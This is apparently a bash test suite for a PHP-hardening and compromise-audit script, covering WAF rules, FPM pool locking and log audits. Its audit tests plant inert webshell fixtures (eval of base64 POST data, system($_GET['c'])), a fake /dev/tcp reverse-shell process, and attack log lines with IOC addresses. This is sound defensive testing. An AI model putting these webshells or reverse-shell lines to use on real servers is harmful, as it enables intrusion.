#!/usr/bin/env bash
# End-to-end tests for install.sh. Runs as root inside a throwaway container:
#   docker run --rm --cap-add SYS_PTRACE -v "$PWD:/src:ro" debian:trixie bash /src/tests/run.sh
# Installs PHP with the distro package manager, then exercises every mode.

set -u
S=/src/install.sh
PASS=0; FAIL=0
pass() { echo "PASS: $*"; PASS=$((PASS+1)); }
fail() { echo "FAIL: $*"; FAIL=$((FAIL+1)); }
same() { [ "$(sha256sum < "$1")" = "$(sha256sum < "$2")" ]; }
# apachectl start/stop return before the server is really up/down: wait on the port
# start / stop and wait until Apache really answers / the old master is really gone (pid file removed)
a_start() { for _ in 1 2 3; do apache2ctl start >/dev/null 2>&1
  for _ in $(seq 50); do curl -s -o /dev/null localhost/ && return; sleep 0.2; done; done; }
a_stop()  { apache2ctl stop >/dev/null 2>&1
  for _ in $(seq 100); do [ -e /var/run/apache2/apache2.pid ] || curl -s -o /dev/null localhost/ || return; sleep 0.2; done; }
expect_rc() { local want="$1" got="$2" what="$3"; [ "$got" = "$want" ] && pass "$what (rc=$got)" || fail "$what (rc=$got, want $want)"; }

echo "== Installing PHP"
if command -v apt-get >/dev/null; then
  apt-get update -qq >/dev/null
  DEBIAN_FRONTEND=noninteractive apt-get install -y -qq php-cli php-fpm apache2 libapache2-mod-php nginx curl >/dev/null 2>&1
  INI_DIR="$(ls -d /etc/php/*/ | head -1)"
  CLI_INI="${INI_DIR}cli/php.ini"; POOL="${INI_DIR}fpm/pool.d/www.conf"; CONFD="${INI_DIR}cli/conf.d"
  POOL2="${INI_DIR}fpm/pool.d/second.conf"; WEBUSER=www-data; SOCK2=/run/php/second.sock
  MODPHP=1
elif command -v dnf >/dev/null; then
  dnf install -y -q php-cli php-fpm httpd procps-ng iproute >/dev/null 2>&1
  CLI_INI=/etc/php.ini; POOL=/etc/php-fpm.d/www.conf; CONFD=/etc/php.d
  POOL2=/etc/php-fpm.d/second.conf; WEBUSER=apache; SOCK2=/run/php-fpm/second.sock
  MODPHP=0
else
  echo "unsupported image"; exit 1
fi
command -v php >/dev/null || { echo "PHP install failed"; exit 1; }
echo "PHP $(php -r 'echo PHP_VERSION;')"

# Overrides the script must catch
echo "php_value[session.upload_progress.enabled] = 1" >> "$POOL"
echo "session.upload_progress.enabled=On" > "$CONFD/99-test-on.ini"
# A pool with no setting at all: must get php_admin_flag added
printf '[second]
user = %s
group = %s
listen = %s
listen.owner = %s
listen.group = %s
pm = ondemand
pm.max_children = 2
'   "$WEBUSER" "$WEBUSER" "$SOCK2" "$WEBUSER" "$WEBUSER" > "$POOL2"
# Not an FPM pool (dovecot-style "listen ="): must not be touched
printf '[section]
listen = *
' > /etc/decoy-test.conf; cp -p /etc/decoy-test.conf /root/decoy.orig
FPMBIN="$(ls /usr/sbin/php-fpm* | head -1)"
cp -p "$CLI_INI" /root/cli.ini.orig

echo "== --waf-print"
out="$(bash $S --waf-print)"; expect_rc 0 $? "waf-print"
echo "$out" | grep -q 'SecRule ARGS_NAMES' && pass "waf-print has ModSecurity rule" || fail "waf-print content"
echo "$out" | grep -q 'id:1026111,.*t:length' && pass "waf-print has the urlencoded OOM rule" || fail "waf-print missing urlencoded OOM rule"
echo "$out" | sed -n '/AWS WAF/,/^$/p' | grep '^# [{ ]' | sed 's/^# //' > /tmp/aws-waf.json
php -r 'exit(is_array(json_decode(file_get_contents("/tmp/aws-waf.json"), true)) ? 0 : 1);' && pass "waf-print AWS WAF rule is valid JSON" || fail "AWS WAF rule JSON"
rm -f /tmp/aws-waf.json

echo "== --dry-run changes nothing"
bash $S --dry-run >/dev/null; expect_rc 0 $? "dry-run"
same "$CLI_INI" /root/cli.ini.orig && pass "dry-run left php.ini alone" || fail "dry-run modified php.ini"
ls /etc/apache2/conf-available/zz-php2shell.conf >/dev/null 2>&1 && fail "dry-run wrote mod_php conf" || pass "dry-run wrote no mod_php conf"

echo "== fix"
bash $S; expect_rc 0 $? "fix"
[ "$(php -r 'echo ini_get("session.upload_progress.enabled");')" = "" ] || [ "$(php -r 'echo ini_get("session.upload_progress.enabled");')" = "0" ] \
  && pass "CLI effective value Off" || fail "CLI still On"
grep -q '^php_admin_flag\[session.upload_progress.enabled\] = off' "$POOL" && pass "pool hardened" || fail "pool not hardened"
grep -qi 'session.upload_progress.enabled = Off' "$CONFD/99-test-on.ini" && pass "conf.d override fixed" || fail "conf.d override"
ls "$CLI_INI".bak-* >/dev/null 2>&1 && pass "backup created" || fail "no backup"
grep -q '^php_admin_flag\[session.upload_progress.enabled\] = off' "$POOL2" && pass "bare pool locked with php_admin_flag" || fail "bare pool not locked"
"$FPMBIN" -t >/dev/null 2>&1 && pass "php-fpm -t passes after locking" || fail "php-fpm -t fails"
same /etc/decoy-test.conf /root/decoy.orig && pass "non-FPM 'listen =' config untouched" || fail "decoy config modified"

echo "== idempotent"
bash $S | grep -q '^Changed: 0 ' && pass "second run changes nothing" || fail "second run changed something"

if [ "$MODPHP" = 1 ]; then
  echo "== mod_php vs .htaccess"
  apache2ctl -t >/dev/null 2>&1 && pass "apache config valid" || fail "apache config broken"
  sed -i "/<Directory \/var\/www\/>/,/<\/Directory>/ s/AllowOverride None/AllowOverride All/" /etc/apache2/apache2.conf
  echo '<?php var_export(ini_get("session.upload_progress.enabled"));' > /var/www/html/t.php
  echo 'php_flag session.upload_progress.enabled on' > /var/www/html/.htaccess
  a_start
  r="$(curl -s localhost/t.php)"
  [ "$r" = "'0'" ] && pass ".htaccess cannot re-enable (got $r)" || fail ".htaccess re-enabled it (got $r)"
  a_stop

  echo "== --waf-print Apache rule, server-wide"
  W=/etc/apache2/conf-enabled/zz-php2shell-waf.conf
  bash $S --waf-print | sed -n '/^<Location "\/">/,/^<\/Location>/p' > "$W"
  bash $S --waf-print | grep '^LogFormat .* php2shell$' >> "$W"
  grep -q 'Require all denied' "$W" && pass "extracted server-wide Apache rule" || fail "could not extract Apache rule"
  apache2ctl -t >/dev/null 2>&1 && pass "waf Apache snippet passes configtest" || fail "waf Apache snippet breaks config"
  mkdir -p /var/www/html/sub && cp /var/www/html/t.php /var/www/html/sub/
  a2enmod -q rewrite >/dev/null 2>&1   # the bypass attempts below use mod_rewrite
  printf 'RewriteEngine On\nRewriteRule ^nothing$ - [L]\nRequire all granted\n' > /var/www/html/sub/.htaccess   # bypass attempt
  a_start
  code() { curl -s -o /dev/null -w '%{http_code}' "$@"; }
  waf_checks() {   # $1 = base URL
    [ "$(code -F a=b "$1/t.php")" = 403 ] && pass "$2: multipart POST blocked" || fail "$2: multipart POST not blocked"
    [ "$(code -X PUT -F a=b "$1/t.php")" = 403 ] && pass "$2: multipart PUT blocked" || fail "$2: multipart PUT not blocked"
    [ "$(code -H 'Content-Type: MuLtIpArT/form-data; boundary=x' --data-binary x "$1/t.php")" = 403 ]       && pass "$2: mixed-case Content-Type blocked" || fail "$2: mixed-case Content-Type not blocked"
    [ "$(code -F a=b "$1/wp-admin/async-upload.php-evil.php")" = 403 ] && pass "$2: prefix trick blocked" || fail "$2: prefix trick not blocked"
    [ "$(code -F a=b "$1/wp-admin/async-upload.php")" != 403 ] && pass "$2: allowlisted path passes" || fail "$2: allowlisted path blocked"
    [ "$(code -d a=b "$1/t.php")" = 200 ] && pass "$2: urlencoded POST passes" || fail "$2: urlencoded POST blocked"
    [ "$(code -H 'Content-Type: application/json' -d '{}' "$1/t.php")" = 200 ] && pass "$2: JSON POST passes" || fail "$2: JSON POST blocked"
  }
  waf_checks http://localhost apache
  [ "$(code -F a=b localhost/sub/t.php)" = 403 ] && pass "apache: subfolder .htaccess cannot bypass" || fail "apache: subfolder .htaccess bypassed the rule"
  out="$(bash $S --probe=http://localhost/t.php)"; rc=$?
  [ "$rc" = 0 ] && echo "$out" | grep -q 'blocked before PHP' && pass "--probe reports the edge block (rc=0)" || fail "--probe on blocked server (rc=$rc)"
  a_stop
  # vhost with its own rewrite rules still inherits the block
  VH=/etc/apache2/sites-enabled/000-default.conf; cp "$VH" /root/vhost.orig
  sed -i 's|</VirtualHost>|    RewriteEngine On\n    RewriteRule ^/nothing$ - [L]\n</VirtualHost>|' "$VH"
  a_start
  [ "$(code -F a=b localhost/t.php)" = 403 ] && pass "apache: vhost with own RewriteEngine still blocked" || fail "apache: vhost rewrite rules dropped the block"
  a_stop
  cp /root/vhost.orig "$VH"
  rm -rf "$W" /var/www/html/sub
  a_start
  bash $S --probe=http://localhost/t.php >/dev/null; expect_rc 1 $? "--probe reports multipart reaching PHP without the rule"
  a_stop

  echo "== nginx + FPM: .user.ini cannot re-enable on a locked pool; nginx WAF rule"
  echo 'session.upload_progress.enabled = On' > /var/www/html/.user.ini
  bash $S --waf-print | sed -n '/^map /,/^}/p' > /etc/nginx/conf.d/php2shell.conf
  bash $S --waf-print | sed -n '/^log_format php2shell/,/;$/p' >> /etc/nginx/conf.d/php2shell.conf
  guard="$(bash $S --waf-print | grep -E '^#   (set|if) ' | sed 's/^#   //')"
  cat > /etc/nginx/sites-enabled/default <<NGX
server {
    listen 8080;
    root /var/www/html;
    $guard
    location ~ \.php\$ { include fastcgi_params; fastcgi_param SCRIPT_FILENAME \$document_root\$fastcgi_script_name; fastcgi_pass unix:$SOCK2; }
}
NGX
  nginx -t >/dev/null 2>&1 && pass "nginx snippet passes nginx -t" || fail "nginx snippet breaks config"
  mkdir -p /run/php /run/php-fpm; "$FPMBIN" -D && nginx
  for _ in $(seq 50); do [ "$(code localhost:8080/t.php)" = 200 ] && break; sleep 0.2; done
  r="$(curl -s localhost:8080/t.php)"
  [ "$r" = "'0'" ] && pass ".user.ini cannot re-enable on locked pool (got $r)" || fail ".user.ini re-enabled it (got $r)"
  waf_checks http://localhost:8080 nginx

  echo "== live FastCGI check of running pools"
  out="$(bash $S --check 2>&1)"
  echo "$out" | grep -q 'second @ .*(fpm-pool .*mitigation on' && pass "--check reads the live pool value over FastCGI" || { fail "--check live pool"; echo "$out" | grep -i pool; }
  bash $S --no-restart | grep -q 'FPM pool second .*Off (live)' && pass "fix verification queries live pools" || fail "fix verification live pools"
  # A pool that forces it On (added after the fix) must show up as mitigation off
  POOL3="$(dirname "$POOL2")/third.conf"
  printf '[third]\nuser = %s\ngroup = %s\nlisten = 127.0.0.1:9123\npm = ondemand\npm.max_children = 2\nphp_admin_value[session.upload_progress.enabled] = 1\n' "$WEBUSER" "$WEBUSER" > "$POOL3"
  pkill -f php-fpm; sleep 1; "$FPMBIN" -D; sleep 1
  bash $S --check 2>&1 | grep -q 'third @ 127.0.0.1:9123 (fpm-pool .*mitigation off' && pass "live check catches a pool forcing it On (TCP listener)" || fail "live check missed pool forcing On"
  bash $S --check --json | php -r '$j = json_decode(stream_get_contents(STDIN), true); exit(is_array($j) && isset($j["results"][0]["status"]) ? 0 : 1);' \
    && pass "--check --json is valid JSON" || fail "--check --json invalid"
  bash $S --interim 2>&1 | grep -q 'second @ .*(live pool).*memory_limit='     && pass "--interim reads interim settings from live pools" || fail "--interim live pools"
  bash $S --interim 2>&1 | grep -q 'second @ .*(live pool).*opcache\.enable='  && pass "--interim reports opcache.enable per live pool" || fail "--interim opcache.enable"
  rm -f "$POOL3"
  # php-fpm expands $pool in listen (Plesk / panel-style pools), and values may be quoted
  POOL4="$(dirname "$POOL2")/fourth.conf"
  printf '[fourth]\nuser = %s\ngroup = %s\nlisten = "%s/$pool.sock"\nlisten.owner = %s\npm = ondemand\npm.max_children = 2\n' \
    "$WEBUSER" "$WEBUSER" "$(dirname "$SOCK2")" "$WEBUSER" > "$POOL4"
  pkill -f php-fpm; sleep 1; "$FPMBIN" -D; sleep 1
  bash $S --check 2>&1 | grep -q "fourth @ $(dirname "$SOCK2")/fourth.sock (fpm-pool " && pass "live check expands \$pool in a quoted listen path" || fail "live check \$pool listen"
  rm -f "$POOL4"

  echo "== --check after a package update"
  # Simulate an update: the binary is replaced on disk while the old master keeps running
  cp -p "$FPMBIN" /root/fpm.new && rm -f "$FPMBIN" && cp -p /root/fpm.new "$FPMBIN"
  out="$(bash $S --check 2>&1)"
  echo "$out" | grep -q 'Still running replaced (old) PHP code, restart these: php-fpm' && pass "--check catches workers still running the old PHP" || fail "stale workers not reported"
  echo "$out" | grep -q 'restart every PHP worker' && pass "--check prints update / restart hints" || fail "no update hints"
  pkill -f php-fpm; sleep 1; "$FPMBIN" -D; sleep 1
  bash $S --check 2>&1 | grep -q 'Still running replaced' && fail "stale reported after restart" || pass "no stale report after restart"
  rm -f /root/fpm.new
  nginx -s stop; pkill -f php-fpm; sleep 1
  rm -f /var/www/html/.user.ini /etc/nginx/conf.d/php2shell.conf
fi

echo "== --interim: RLIMIT_AS / RLIMIT_DATA on PHP processes, RLimitMEM in Apache"
bash $S --interim >/dev/null 2>&1; expect_rc 0 $? "--interim on a host without address-space limits"
cp "$(command -v sleep)" /tmp/php-fpm-limtest
prlimit --as=8000000000 /tmp/php-fpm-limtest 60 & LP=$!; sleep 1
out="$(bash $S --interim 2>&1)"; rc=$?
echo "$out" | grep -q "php-fpm-limtest (pid $LP) runs with Max address space = 8000000000" && [ "$rc" = 1 ]   && pass "--interim flags a PHP process with RLIMIT_AS (rc=$rc)" || fail "--interim missed RLIMIT_AS (rc=$rc)"
kill "$LP" 2>/dev/null; wait "$LP" 2>/dev/null; rm -f /tmp/php-fpm-limtest
AD=/etc/apache2/conf-enabled; [ -d "$AD" ] || AD=/etc/httpd/conf.d
if [ -d "$AD" ]; then
  echo 'RLimitMEM 500000000' > "$AD/zz-rlimtest.conf"
  bash $S --interim 2>&1 | grep -q 'RLimitMEM sets RLIMIT_DATA' && pass "--interim flags Apache RLimitMEM" || fail "--interim missed RLimitMEM"
  rm -f "$AD/zz-rlimtest.conf"
fi

echo "== --check"
bash $S --check; rc=$?
[ "$rc" = 0 ] || [ "$rc" = 1 ] && pass "check runs (rc=$rc)" || fail "check rc=$rc"

echo "== --audit finds a planted webshell"
mkdir -p /var/www/html
# inert webshell-shaped fixture for the audit test (Apache is stopped, file removed right after)
echo '<?php eval(base64_decode($_POST["x"]));' > /var/www/html/shell.php
out="$(bash $S --audit 2>&1)"; rc=$?
expect_rc 3 "$rc" "audit flags findings"
echo "$out" | grep -q 'Webshell-like code: /var/www/html/shell.php' && pass "audit names the webshell" || fail "audit missed webshell"
rm -f /var/www/html/shell.php

echo "== --audit: worker crashes, temp-dir PHP, reverse shell"
echo "WARNING: [pool www] child 4242 exited on signal 11 (SIGSEGV) after 0.5 seconds from start" >> /var/log/phptest-fpm.log
echo '<?php echo 1;' > /tmp/dropper.php
sh -c 'sleep 60; : /dev/tcp/203.0.113.7/4444' & RS=$!
out="$(bash $S --audit 2>&1)"
echo "$out" | grep -q 'worker crash line(s) in /var/log/phptest-fpm.log' && pass "audit flags worker crash" || fail "audit missed worker crash"
echo "NOTICE: PHP message: PHP Fatal error:  Allowed memory size of 16777216 bytes exhausted (tried to allocate 3500032 bytes) in Unknown on line 0" >> /var/log/phptest-fpm.log
echo "NOTICE: PHP message: PHP Fatal error:  Allowed memory size of 16777216 bytes exhausted (tried to allocate 20480 bytes) in /var/www/html/x.php on line 3" >> /var/log/phptest-fpm.log
out2="$(bash $S --audit 2>&1)"
echo "$out2" | grep -q '1 request-startup out-of-memory line(s)' && pass "audit flags request-startup OOM (only 'Unknown on line 0')" || fail "audit missed request-startup OOM"
echo "$out" | grep -q 'PHP file in a temp directory: /tmp/dropper.php' && pass "audit flags temp-dir PHP" || fail "audit missed temp-dir PHP"
echo "$out" | grep -q 'Reverse-shell-like process' && pass "audit flags reverse-shell command line" || fail "audit missed reverse shell"
kill "$RS" 2>/dev/null; pkill -f '203.0.113.7' 2>/dev/null; rm -f /var/log/phptest-fpm.log /tmp/dropper.php
ALOG=/var/log/apache2/test-access.log; [ -d /var/log/apache2 ] || ALOG=/var/log/httpd/test_access_log
echo '198.51.100.9 - - [21/Oct/2026:09:00:00 +0000] "POST /index.php HTTP/1.1" 502 0 "-" "x" ct="multipart/form-data; boundary=z"' > "$ALOG"
bash $S --audit 2>&1 | grep -q 'multipart request(s) answered with 500-504' && pass "audit flags multipart 5xx from Content-Type logs" || fail "audit missed multipart 5xx"
rm -f "$ALOG"

echo "== --audit: published indicators in rotated logs, session-file webshell, exposure window"
# rotated + gzipped log with a php://filter read-back from a published IOC address and a scanner UA (inert text)
printf '%s\n' '221.14.159.134 - - [21/Oct/2026:17:23:00 +0000] "GET /download.php?file=php://filter/convert.base64-encode/resource=/var/lib/php/sessions/sess_x HTTP/1.1" 404 0 "-" "-"' \
  '198.51.100.20 - - [21/Oct/2026:17:30:00 +0000] "POST /index.php HTTP/1.1" 200 5 "-" "php2shell-scan/109618"' \
  '198.51.100.21 - - [21/Oct/2026:18:16:00 +0000] "POST / HTTP/1.1" 200 5 "-" "B8RAT/1.0"' \
  '94.154.43.7 - - [21/Oct/2026:16:21:09 +0000] "POST / HTTP/1.1" 500 0 "-" "-" ct="multipart/form-data; boundary=----p2shell0123456789abcdef01234567"' | gzip > "$ALOG.2.gz"
cat > /tmp/sess_phpfixtest <<'SESS'
x|s:44:"<?php echo 'PWNED::'; system($_GET['c']); ?>";
SESS
out="$(bash $S --audit 2>&1)"; rc=$?
expect_rc 3 "$rc" "audit flags published indicators"
echo "$out" | grep -q 'IOC addresses .*221\.14\.159\.134 (1)' && pass "audit flags an IOC address in a rotated .gz log" || fail "audit missed IOC address in rotated log"
echo "$out" | grep -q 'php://filter in request URLs .*221\.14\.159\.134' && pass "audit flags php://filter read-back" || fail "audit missed php://filter"
echo "$out" | grep -q 'scanner user agents .*198\.51\.100\.20 (1)' && pass "audit reports php2shell scanner UA" || fail "audit missed scanner UA"
echo "$out" | grep 'php2shell attack tool' | grep -q '198\.51\.100\.21 (1)' && echo "$out" | grep 'php2shell attack tool' | grep -q '94\.154\.43\.7 (1)' \
  && pass "audit flags the B8RAT UA and the p2shell boundary (OffSeq)" || fail "audit missed B8RAT / p2shell boundary"
echo "$out" | grep -q 'IOC addresses .*94\.154\.43\.7 (1)' && pass "audit knows the OffSeq IOC addresses" || fail "audit missed OffSeq IOC address"
echo "$out" | grep -q 'Session file holds PHP code .*/tmp/sess_phpfixtest' && pass "audit flags a session-file webshell" || fail "audit missed session-file webshell"
echo "$out" | grep -q 'audit=exposure covers' && pass "48 h audit points to --audit=exposure" || fail "no exposure hint"
bash $S --audit=exposure 2>&1 | grep -qE 'audit, last [0-9]+h' && pass "--audit=exposure computes the window" || fail "--audit=exposure"
bash $S --audit=exposure 2>&1 | grep -q 'audit=exposure covers' && fail "exposure window still hints at itself" || pass "exposure window reaches 17 Oct"
rm -f "$ALOG.2.gz" /tmp/sess_phpfixtest

echo "== --audit: disguised webshells (double extension, image polyglot)"
mkdir -p /var/www/html/uploads
printf 'GIF89a<?php echo 1; ?>' > /var/www/html/uploads/avatar.gif         # inert polyglot fixture
printf 'GIF89a' > /var/www/html/uploads/clean.gif
echo '<?php echo 1;' > /var/www/html/uploads/avatar.php.jpg
out="$(bash $S --audit 2>&1)"
echo "$out" | grep -q 'Image file containing PHP code .*/uploads/avatar.gif' && pass "audit flags an image polyglot" || fail "audit missed image polyglot"
echo "$out" | grep -q 'clean.gif' && fail "audit flagged a clean image" || pass "clean image not flagged"
echo "$out" | grep -q 'Double-extension PHP file .*/uploads/avatar.php.jpg' && pass "audit flags a double-extension file" || fail "audit missed double extension"
rm -rf /var/www/html/uploads

echo "== --audit output cannot carry terminal escapes"
evil="/var/www/html/$(printf 'x\033[2J\033[1A[OK] clean')"
echo '<?php system($_GET["c"]);' > "$evil"
out="$(bash $S --audit 2>&1)"
printf '%s' "$out" | grep -q "$(printf '\033')\[2J" && fail "escape sequence reached the terminal" || pass "escape sequences stripped"
rm -f "$evil"
for c1 in '\233' '\302\233'; do   # 8-bit CSI and UTF-8 encoded CSI
  evil="/var/www/html/$(printf "y${c1}2J")ü.php"
  echo '<?php system($_GET["c"]);' > "$evil"
  out="$(bash $S --audit 2>&1)"
  printf '%s' "$out" | LC_ALL=C grep -q "$(printf "$c1")" && fail "C1 control ($c1) reached the terminal" || pass "C1 control ($c1) stripped"
  printf '%s' "$out" | grep -q 'ü\.php' && pass "UTF-8 name kept readable" || fail "UTF-8 name mangled"
  rm -f "$evil"
done

echo "== stub binaries: EOL and < 5.4"
printf '#!/bin/sh\ncase "$2" in *PHP_VERSION*) echo 7.4.33;; *) echo;; esac\n' > /usr/bin/php74; chmod +x /usr/bin/php74
bash $S --no-restart | grep -q 'EOL branch' && pass "EOL warning" || fail "no EOL warning"
printf '#!/bin/sh\ncase "$2" in *PHP_VERSION*) echo 5.3.29;; *) echo;; esac\n' > /usr/bin/php53; chmod +x /usr/bin/php53
bash $S --no-restart >/dev/null; expect_rc 2 $? "PHP < 5.4 exits 2"
rm -f /usr/bin/php74 /usr/bin/php53

echo "== --check update hints per PHP source (fake panel dirs)"
mkdir -p /usr/local/psa /opt/cpanel/ea-php83 /usr/local/directadmin /opt/alt/php83
printf '#!/bin/sh\ncase "$2" in *PHP_VERSION*) echo 7.4.33;; *) echo;; esac\n' > /usr/bin/php74; chmod +x /usr/bin/php74   # something unpatched
out="$(bash $S --check 2>&1)"; rm -f /usr/bin/php74
for w in 'Plesk PHP' 'cPanel EA4 PHP' 'DirectAdmin CustomBuild' 'CloudLinux alt-php'; do
  echo "$out" | grep -q "$w" && pass "hint: $w" || fail "no hint: $w"
done
rmdir /usr/local/psa /opt/cpanel/ea-php83 /opt/cpanel /usr/local/directadmin /opt/alt/php83 /opt/alt 2>/dev/null

if grep -q '^ID=ubuntu' /etc/os-release; then
  echo "== --check: Ubuntu fixed builds (USN-8948)"
  bash $S --check 2>&1 | grep -q 'php8.3 (cli 8.3.6): PATCHED.*Ubuntu fixed build 8.3.6-0ubuntu0.24.04.[0-9]* (USN-8948' \
    && pass "--check matches the Ubuntu build against USN-8948" || fail "Ubuntu fixed build not recognised"
  PHPFIX_UBUNTU_FIXED="noble:8.3:8.3.6-0ubuntu0.24.04.999" bash $S --check 2>&1 \
    | grep -q "php8.3 (cli 8.3.6): UNPATCHED.*Ubuntu's fixed build is 8.3.6-0ubuntu0.24.04.999" \
    && pass "--check reports an Ubuntu build older than the USN as unpatched" || fail "old Ubuntu build not reported"
fi

echo "== --check: DirectAdmin CustomBuild backport (same version number, extra patch)"
DAP=/usr/local/directadmin/custombuild/patches/php-7.4
mkdir -p /usr/local/php74/bin "$DAP"
printf '#!/bin/sh\ncase "$2" in *PHP_VERSION*) echo 7.4.33;; *) echo;; esac\n' > /usr/local/php74/bin/php; chmod +x /usr/local/php74/bin/php
touch -d '2026-10-21 12:00' "$DAP/143-php-7.4-cve-2026-109618.patch"; touch -d '2026-10-21 13:00' /usr/local/php74/bin/php
bash $S --check 2>&1 | grep -q 'php74/bin/php (cli 7.4.33): PATCHED.*DirectAdmin CustomBuild backport' \
  && pass "DA: binary built after the CVE patch is PATCHED" || fail "DA built binary not recognised"
touch -d '2026-10-21 11:00' /usr/local/php74/bin/php
bash $S --check 2>&1 | grep -q 'php74/bin/php (cli 7.4.33): UNPATCHED.*da build php' \
  && pass "DA: binary older than the CVE patch says da build php" || fail "DA pending build not reported"
rm -rf /usr/local/php74 /usr/local/directadmin

if command -v dpkg-deb >/dev/null; then
  echo "== --check: cPanel EA4 backport (same version, package release 19)"
  PK=/tmp/ea-php74-pkg
  mkdir -p "$PK/DEBIAN" "$PK/opt/cpanel/ea-php74/root/usr/bin"
  printf '#!/bin/sh\ncase "$2" in *PHP_VERSION*) echo 7.4.33;; *) echo;; esac\n' > "$PK/opt/cpanel/ea-php74/root/usr/bin/php"
  chmod +x "$PK/opt/cpanel/ea-php74/root/usr/bin/php"
  printf 'Package: ea-php74-php-cli\nVersion: 7.4.33-19.cpanel\nArchitecture: all\nMaintainer: test <t@t>\nDescription: stub\n' > "$PK/DEBIAN/control"
  dpkg-deb -b "$PK" /tmp/ea-php74.deb >/dev/null 2>&1 && dpkg -i /tmp/ea-php74.deb >/dev/null 2>&1
  bash $S --check 2>&1 | grep -q 'ea-php74/root/usr/bin/php (cli 7.4.33): PATCHED.*cPanel EA4 backport (package release 19' \
    && pass "cPanel: ea-php74 release 19 is PATCHED" || fail "cPanel backport not recognised"
  PHPFIX_CPANEL_FIXED="74:20" bash $S --check 2>&1 | grep -q "ea-php74/root/usr/bin/php (cli 7.4.33): UNPATCHED.*release 20 (EA4 25.91), installed 19: upgrade 'ea-php\*'" \
    && pass "cPanel: an older ea-php74 release is UNPATCHED" || fail "old cPanel release not reported"
  dpkg -r ea-php74-php-cli >/dev/null 2>&1
  # CloudLinux's own ea-php build (fixed at 7.4.33-18.*.cloudlinux.13) must not be judged by cPanel's numbers
  sed -i 's/^Version: .*/Version: 7.4.33-18.el8.cloudlinux.13/' "$PK/DEBIAN/control"
  dpkg-deb -b "$PK" /tmp/ea-php74.deb >/dev/null 2>&1 && dpkg -i /tmp/ea-php74.deb >/dev/null 2>&1
  out="$(bash $S --check 2>&1 | grep 'ea-php74/root/usr/bin/php (cli 7.4.33)')"
  [ -n "$out" ] && ! echo "$out" | grep -q 'cPanel EA4' \
    && pass "CloudLinux ea-php build not judged by cPanel release numbers" || fail "CloudLinux ea-php judged by cPanel release numbers: $out"
  dpkg -r ea-php74-php-cli >/dev/null 2>&1; rm -rf "$PK" /tmp/ea-php74.deb; rmdir -p /opt/cpanel/ea-php74/root/usr/bin 2>/dev/null
fi

echo "== --audit: fileless / deleted binary, session decode failures"
cp "$(command -v bash)" /tmp/phpfix-dropbin && chmod 755 /tmp/phpfix-dropbin   # not sleep: a multi-call coreutils on EL
setsid su -s /bin/sh "$WEBUSER" -c 'exec /tmp/phpfix-dropbin -c "sleep 120; :"' >/dev/null 2>&1 &
DPID=""; for _ in $(seq 50); do DPID="$(pgrep -f '^/tmp/phpfix-dropbin')" && break; sleep 0.1; done
rm -f /tmp/phpfix-dropbin
echo "WARNING: [pool www] PHP Warning:  session_start(): Failed to decode session object. Session has been destroyed" >> /var/log/phptest-fpm.log
out="$(bash $S --audit 2>&1)"
if [ -z "$DPID" ]; then
  fail "test dropper process did not start"
elif readlink "/proc/$DPID/exe" >/dev/null 2>&1; then
  echo "$out" | grep -q "($WEBUSER) runs a deleted binary: /tmp/phpfix-dropbin" && pass "audit flags a web-user process running a deleted binary" || fail "audit missed deleted binary"
else
  pass "deleted-binary check skipped: root cannot read other users' /proc/PID/exe here (no CAP_SYS_PTRACE)"
fi
echo "$out" | grep -q "1 'Failed to decode session object' line(s)" && pass "audit reports session decode failures" || fail "audit missed session decode failures"
pkill -f phpfix-dropbin 2>/dev/null; rm -f /var/log/phptest-fpm.log

echo "== --waf-print: PHPSESSID disclosure rule"
re="$(bash $S --waf-print | sed -n 's/^  SecRule MATCHED_VAR "!@rx \(.*\)" ""$/\1/p')"
[ -n "$re" ] && RE="$re" php -r '
$re = "/" . str_replace("/", "\/", getenv("RE")) . "/";
$good = ["PHPSESSID=0123456789abcdef0123456789abcdef; path=/; HttpOnly", "PHPSESSID=deleted; expires=Thu, 01 Jan 1970 00:00:01 GMT",
         "PHPSESSID=a1B2c3D4e5F6g7H8i9J0k1L2m3; path=/", "phpsessid=Ab,-0123456789abcdef"];
$bad  = ["PHPSESSID=%00%01%02secret%3Dhunter2; path=/", "PHPSESSID=" . str_repeat("a", 300) . "; path=/"];
foreach ($good as $c) if (!preg_match($re, $c)) { echo "false positive: $c\n"; exit(1); }
foreach ($bad as $c)  if (preg_match($re, $c))  { echo "missed: $c\n"; exit(1); }' \
  && pass "PHPSESSID rule passes real IDs / logout, catches leaks" || fail "PHPSESSID rule regex"
re="$(bash $S --waf-print | grep -A1 '^SecRule ARGS_NAMES "@rx (?:' | head -1 | sed -n 's/^SecRule ARGS_NAMES "@rx \(.*\)" \\$/\1/p')"
[ -n "$re" ] && RE="$re" php -r '
$re = "/" . str_replace("/", "\\/", getenv("RE")) . "/";
$deep = "f0"; for ($i = 0; $i < 60; $i++) $deep .= "[k$i]";
$ok = ["user[address][street]", "items[0][options][color][]", "a[b][c][d][e][f][g][h][i][j]"];
foreach ($ok as $n) if (preg_match($re, $n)) { echo "false positive: $n\n"; exit(1); }
exit(preg_match($re, $deep) ? 0 : 1);' && pass "nesting rule blocks f0[k0]..[k59], passes normal forms" || fail "nesting rule regex"
bash $S --waf-print | grep -q '^SecRule REQUEST_HEADERS:User-Agent "@rx ^B8RAT/"' && pass "waf-print has the B8RAT rule" || fail "waf-print missing B8RAT rule"

echo "== --check: Imunify360 WAF ruleset version"
IMV=/etc/apache2/conf.d/modsec_vendor_configs/imunify360-full-apache
mkdir -p "$IMV" && echo 8.82 > "$IMV/VERSION"
bash $S --check 2>&1 | grep -q 'Imunify360 WAF rules 8.82 are older than 8.83' && pass "Imunify360 < 8.83 flagged" || fail "Imunify360 old ruleset not flagged"
echo 8.83 > "$IMV/VERSION"
bash $S --check 2>&1 | grep -q 'Imunify360 WAF rules 8.83: 8.84+' && pass "Imunify360 8.83 asks for 8.84+" || fail "Imunify360 8.83 not tiered"
echo 8.85 > "$IMV/VERSION"
bash $S --check 2>&1 | grep -q 'Imunify360 WAF rules 8.85 (>= 8.85' && pass "Imunify360 8.85 recognised" || fail "Imunify360 8.85 not recognised"
rm -rf /etc/apache2/conf.d/modsec_vendor_configs; rmdir /etc/apache2/conf.d /etc/apache2 2>/dev/null

if [ "$MODPHP" = 1 ] && grep -qs LoadModule /etc/apache2/mods-enabled/php*.load; then
  echo "== --check: mod_php risk note"
  bash $S --check 2>&1 | grep -q 'Apache mod_php is loaded: the highest-risk' && pass "--check notes mod_php as the highest-risk setup" || fail "mod_php note missing"
fi

echo "== --check knows the fixed versions"
out="$(bash $S --check 2>&1)"
